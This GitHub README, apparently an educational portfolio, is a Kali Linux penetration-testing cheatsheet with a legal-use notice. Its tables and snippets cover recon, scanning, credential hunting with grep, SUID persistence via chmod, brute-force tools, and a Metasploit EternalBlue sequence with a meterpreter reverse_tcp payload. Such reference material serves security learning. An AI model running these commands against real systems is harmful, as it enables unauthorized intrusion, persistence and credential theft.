# 💻 Kali Linux Cheatsheet for Ethical Hackers (2026 Edition)
This repository documents my core cybersecurity knowledge, expanded with examples, real-world scenario, CTF references, and secure software practices. It serves as a learning journal and professional portfolio.

**Author:** Tito Oscar Mwaisengela

**GitHub:** [tito-devsec](https://github.com/tito-devsec)

**Repository:** `essential-linux-cheatsheet`

---

## ⚖️ Legal & Ethical Notice

<aside>
⚠️

**AUTHORIZED USE ONLY**

This repository is created **strictly for educational purposes, authorized penetration testing, CTFs, and defensive security research**.

All techniques demonstrated **MUST** be executed:

- With **explicit written permission**
- Within **defined scope**
- Under **ethical hacking standards**

❌ Unauthorized access, scanning, exploitation, or disruption is **illegal**.

</aside>

---

## 🎯 Introduction

This repository provides a **professional, production-grade Kali Linux cheatsheet** aligned with the **real penetration testing lifecycle**.

Each command includes:

- 🧠 **What it does**
- ⚙️ **How it works internally**
- 🧪 **Real-world pentest usage**
- 🔐 **Security relevance**

---

## 🎓 Who this is for

- Ethical Hackers & Pentesters
- SOC & Blue Team Analysts
- Cybersecurity Students
- CTF Players
- Secure Software Engineers

---

## 📖 Table of Contents

- [Linux Essentials](#linux-essentials)
- [Reconnaissance & OSINT](#reconnaissance-osint)
- [Network Scanning & Enumeration](#network-scanning-enumeration)
- [Vulnerability Assessment](#vulnerability-assessment)
- [Exploitation](#exploitation)
- [Privilege Escalation](#privilege-escalation)
- [Web Application Attacks](#web-application-attacks)
- [Wireless Attacks](#wireless-attacks)
- [Automation & Tool Chaining](#automation-tool-chaining)
- [Additional Resources](#additional-resources)

---

## 🧱 Linux Essentials

### 📁 File & Directory Enumeration

| **Command** | **What It Does** | **How It Works** | **Pentest Use Case** |
| --- | --- | --- | --- |
| `ls -la` | Lists all files including hidden | Reads inode metadata | Find hidden configs & keys |
| `find / -name "*.conf" 2>/dev/null` | Searches config files | Recursive filesystem traversal | Locate service configs |
| `grep -r "password" /etc/` | Searches sensitive keywords | Regex pattern matching | Credential discovery |

🔎 **Security relevance:** Misconfigured files often expose credentials, tokens, or secrets.

### 🔐 Permissions & Privilege Abuse

| **Command** | **What It Does** | **How It Works** | **Pentest Use Case** |
| --- | --- | --- | --- |
| `find / -perm -4000 2>/dev/null` | Finds SUID binaries | Checks permission bits | Privilege escalation |
| `sudo -l` | Lists sudo rights | Reads sudoers policy | GTFOBins abuse |
| `chmod 4755 file` | Sets SUID bit | Modifies permission flags | Post-exploitation persistence |

🚨 **Real vulnerability:** SUID binaries misconfigured = instant root access.

### 🖥️ Process & Network Monitoring

| **Command** | **Purpose** | **How It Works** | **Usage** |
| --- | --- | --- | --- |
| `ps aux` | List running processes | Reads `/proc` | Identify services |
| `netstat -tlnp` | View listening ports | Socket inspection | Service mapping |
| `lsof -i :22` | Open files by port | File descriptor analysis | SSH investigation |

---

## 🔍 Reconnaissance & OSINT

### 🌐 Passive Recon (No Target Interaction)

| **Tool** | **Purpose** | **Explanation** |
| --- | --- | --- |
| `theHarvester` | OSINT harvesting | Collects emails & subdomains |
| `amass enum -passive` | Subdomain discovery | Uses public intelligence |
| [`crt.sh`](http://crt.sh) | Certificate analysis | Finds hidden subdomains |

🛡️ **Why it matters:** Builds attack surface without alerting defenders.

### 🔧 Active Recon (Target Interaction)

| **Tool** | **Purpose** | **Usage** |
| --- | --- | --- |
| `nmap -sC -sV -p-` | Full TCP scan | Service + version detection |
| `masscan` | Fast scanning | Large networks |
| `gobuster` | Directory brute force | Web enumeration |

---

## 📡 Network Scanning & Enumeration

### 🧩 Service Enumeration

| **Command** | **Purpose** | **Explanation** |
| --- | --- | --- |
| `enum4linux` | SMB enumeration | Users, shares, policies |
| `rpcclient` | Windows RPC enum | Domain user discovery |
| `smbclient` | SMB access | Anonymous share access |

### 🕵️ OS & Banner Grabbing

| **Command** | **Purpose** | **Explanation** |
| --- | --- | --- |
| `nmap -O` | OS fingerprinting | TCP/IP stack analysis |
| `nc target 80` | Manual banners | Raw TCP |
| `whatweb` | Web fingerprinting | CMS & framework detection |

---

## ⚠️ Vulnerability Assessment

| **Tool** | **Purpose** | **Explanation** |
| --- | --- | --- |
| `nuclei` | CVE scanning | Template-based detection |
| `nikto` | Web vuln scan | Outdated & misconfig checks |
| `sqlmap` | SQL Injection | Automated exploitation |

---

## 💥 Exploitation

### 🔐 Credential Attacks

| **Tool** | **Purpose** | **Explanation** |
| --- | --- | --- |
| `hydra` | Brute force | Parallel authentication |
| `hashcat` | Hash cracking | GPU acceleration |

### 🧬 Metasploit Framework

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target_ip
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
```

🎯 **Used for:** Controlled exploitation with payload management.

---

## 🔼 Privilege Escalation

### 🐧 Linux

| **Tool** | **Purpose** |
| --- | --- |
| [`linpeas.sh`](http://linpeas.sh) | Automated privesc |
| `linux-exploit-suggester` | Kernel exploit matching |

### 🪟 Windows

```powershell
Invoke-AllChecks
winPEASx64.exe
```

---

## 🌐 Web Application Attacks

| **Tool** | **Purpose** |
| --- | --- |
| `ffuf` | Fuzzing |
| `sqlmap` | Database compromise |
| `xsstrike` | XSS discovery |

---

## 📶 Wireless Attacks

| **Tool** | **Purpose** |
| --- | --- |
| `airmon-ng` | Monitor mode |
| `airodump-ng` | Handshake capture |
| `hashcat` | WPA cracking |

---

## 🧰 Automation & Tool Chaining

```bash
#!/bin/bash
TARGET=$1
amass enum -passive -d $TARGET
nmap -sC -sV -p- $TARGET
nuclei -u $TARGET
```

⚙️ **Why automation?** Faster, consistent, professional workflows.

---

## 📚 Additional Resources

| **Category** | **Resource** |
| --- | --- |
| Wordlists | SecLists |
| Exploits | Exploit-DB |
| PrivEsc | GTFOBins |
| Payloads | PayloadsAllTheThings👤 Author |

---

---

⭐ **Star the repo & contribute responsibly! don't forget to follow the account**
